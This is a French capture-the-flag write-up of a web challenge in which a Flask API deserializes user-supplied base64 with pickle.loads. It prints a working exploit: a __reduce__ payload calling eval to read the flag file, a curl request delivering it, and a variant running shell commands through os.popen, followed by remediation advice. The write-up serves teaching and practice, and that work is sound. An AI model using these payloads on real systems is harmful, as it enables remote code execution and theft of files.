# L'Abysse de Pickle (MidHack 2026) — Web

**Flag :** `OPENNC{P1ckl3_R1ck_W0uld_B3_Pr0ud_0f_Y0ur_RC3}`

## Énoncé

Une interface de gestion de station sous-marine sauvegarde son « carnet de bord »
via une sérialisation « native et ultra-performante ». Un message d'alerte
suggère qu'elle est détournable. Instance Docker (ctfd-whale).

## Reconnaissance

Front Vue 3 appelant une API :

- `GET /api/settings` → renvoie les paramètres par défaut encodés en base64 ;
- `POST /api/settings` avec `{"data": "<base64>"}` → décode et charge.

La donnée par défaut décodée est un **pickle** :

```
b'\x80\x04\x95...}\x94(\x8c\x05theme\x94\x8c\x05light\x94...'
-> {'theme':'light','language':'fr','depth':'surface'}
```

Le code serveur (`app.py`) est sans ambiguïté :

```python
decoded_data = base64.b64decode(data)
user_settings = pickle.loads(decoded_data)      # <-- désérialisation non sûre
if not isinstance(user_settings, dict):
    return jsonify({'error': 'Format invalide'}), 400
return jsonify({'message': 'Équipage paré !', 'settings': user_settings})
```

## Faille — désérialisation pickle → RCE

`pickle.loads` exécute le `__reduce__` de tout objet. Comme le résultat doit être
un `dict` (contrôle `isinstance`) **et** que ce dict est **renvoyé tel quel dans
la réponse**, on exfiltre le flag par réflexion : on forge un pickle dont le
`__reduce__` renvoie `eval("{...}")`, produisant directement un dict dont la clé
`theme` contient le contenu du fichier flag.

```python
import pickle, base64
class E:
    def __reduce__(self):
        return (eval, ("{'theme': open('/app/flag.txt').read().strip(), 'language':'fr'}",))
print(base64.b64encode(pickle.dumps(E())).decode())
```

```bash
B=http://legacychalls.hackagou.nc:PORT
curl -s -X POST "$B/api/settings" -H 'Content-Type: application/json' \
  -d "{\"data\":\"$PAYLOAD_B64\"}"
# {"message":"Équipage paré !","settings":{"language":"fr","theme":"OPENNC{P1ckl3_R1ck_W0uld_B3_Pr0ud_0f_Y0ur_RC3}"}}
```

Localisation préalable du flag (l'env `FLAG=flag{...}` est un leurre) :

```python
return (eval, ("{'theme': __import__('os').popen('find / -iname \"*flag*\"; cat /app/flag.txt').read(), 'language':'fr'}",))
# -> /app/flag.txt
```

## Remédiation

Ne jamais `pickle.loads` de données contrôlées par l'utilisateur. Utiliser un
format de données inerte (JSON) pour l'état sérialisé côté client.
